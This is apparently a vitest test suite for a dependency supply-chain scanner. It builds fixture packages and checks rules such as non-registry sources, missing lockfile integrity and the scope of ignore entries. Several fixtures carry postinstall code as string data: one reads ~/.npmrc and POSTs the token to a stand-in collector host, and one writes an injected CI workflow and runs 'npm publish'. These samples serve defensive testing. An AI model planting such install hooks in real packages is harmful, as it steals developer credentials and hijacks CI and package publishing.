// Copyright 2025-2026 miaotouy(Github@miaotouy)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { scanDependencies } from "../security/dependency-scanner";

const temporaryDirectories: string[] = [];

async function createFixture(options?: {
  dependencySpec?: string;
  integrity?: string;
  installScript?: string;
  installFile?: string;
  policy?: object;
}): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "aiohub-dependency-scan-"));
  temporaryDirectories.push(root);
  const dependencySpec = options?.dependencySpec ?? "1.0.0";
  const integrity = options?.integrity ?? "sha512-QUFBQQ==";

  await mkdir(join(root, "scripts", "security"), { recursive: true });
  await writeFile(
    join(root, "package.json"),
    JSON.stringify({
      name: "fixture",
      private: true,
      dependencies: { fixtureDependency: dependencySpec },
    })
  );
  await writeFile(
    join(root, "bun.lock"),
    `{
  "lockfileVersion": 1,
  "configVersion": 1,
  "workspaces": {
    "": {
      "name": "fixture",
      "dependencies": { "fixtureDependency": "${dependencySpec}" },
    },
  },
  "packages": {
    "fixtureDependency": ["fixtureDependency@1.0.0", "", {}, ${JSON.stringify(integrity)}],
  },
}\n`
  );
  await writeFile(
    join(root, "scripts", "security", "dependency-policy.json"),
    JSON.stringify(
      options?.policy ?? {
        allowedNonRegistryDependencies: [],
        allowedLockfileSources: [],
        deniedPackages: [],
        ignoredFindings: [],
      }
    )
  );

  if (options?.installScript && options.installFile) {
    const packageRoot = join(
      root,
      "node_modules",
      ".bun",
      "fixtureDependency@1.0.0",
      "node_modules",
      "fixtureDependency"
    );
    await mkdir(packageRoot, { recursive: true });
    await writeFile(
      join(packageRoot, "package.json"),
      JSON.stringify({
        name: "fixtureDependency",
        version: "1.0.0",
        scripts: { postinstall: options.installScript },
      })
    );
    await writeFile(join(packageRoot, "install.js"), options.installFile);
  }

  return root;
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories
      .splice(0)
      .map((path) => rm(path, { recursive: true, force: true }))
  );
});

describe("dependency supply-chain scanner", () => {
  it("rejects direct non-registry dependency sources", async () => {
    const rootDir = await createFixture({
      dependencySpec: "https://example.invalid/fixture.tgz",
    });

    const report = await scanDependencies({ rootDir, mode: "lock" });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          ruleId: "non-registry-dependency",
          packageName: "fixtureDependency",
        }),
      ])
    );
  });

  it("rejects registry lock records without sha512 integrity", async () => {
    const rootDir = await createFixture({ integrity: "" });

    const report = await scanDependencies({ rootDir, mode: "lock" });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "high",
          ruleId: "missing-lockfile-integrity",
        }),
      ])
    );
  });

  it("detects credential access combined with outbound traffic", async () => {
    const rootDir = await createFixture({
      installScript: "node install.js",
      installFile: `
        const { readFileSync } = require("node:fs");
        const token = readFileSync(process.env.HOME + "/.npmrc", "utf8");
        fetch("https://collector.invalid/upload", { method: "POST", body: token });
      `,
    });

    const report = await scanDependencies({ rootDir, mode: "installed" });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "critical",
          ruleId: "credential-exfiltration-pattern",
          packageName: "fixtureDependency",
        }),
      ])
    );
  });

  it("only suppresses exact ignored findings that include a reason", async () => {
    const rootDir = await createFixture({
      installScript: "node install.js",
      installFile: `fetch("https://downloads.example.invalid/binary");`,
      policy: {
        allowedNonRegistryDependencies: [],
        allowedLockfileSources: [],
        deniedPackages: [],
        ignoredFindings: [
          {
            ruleId: "install-network-access",
            package: "fixtureDependency",
            version: "1.0.0",
            reason: "测试夹具中的固定下载地址",
          },
        ],
      },
    });

    const report = await scanDependencies({ rootDir, mode: "installed" });

    expect(report.suppressedFindings).toBe(1);
    expect(report.findings).toHaveLength(0);
  });

  it("detects package-registry and CI workflow tampering", async () => {
    const rootDir = await createFixture({
      installScript: "node install.js",
      installFile: `
        const { writeFileSync } = require("node:fs");
        writeFileSync(".github/workflows/steal.yml", "name: injected");
        require("node:child_process").execSync("npm publish");
      `,
    });

    const report = await scanDependencies({ rootDir, mode: "installed" });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          severity: "critical",
          ruleId: "ci-workflow-tampering",
        }),
        expect.objectContaining({
          severity: "critical",
          ruleId: "package-registry-mutation",
        }),
      ])
    );
  });

  it("rejects broad ignore entries without a package or location scope", async () => {
    const rootDir = await createFixture({
      policy: {
        allowedNonRegistryDependencies: [],
        allowedLockfileSources: [],
        deniedPackages: [],
        ignoredFindings: [
          {
            ruleId: "install-network-access",
            reason: "范围过宽",
          },
        ],
      },
    });

    await expect(scanDependencies({ rootDir, mode: "lock" })).rejects.toThrow(
      "至少限制 package 或 location"
    );
  });
});
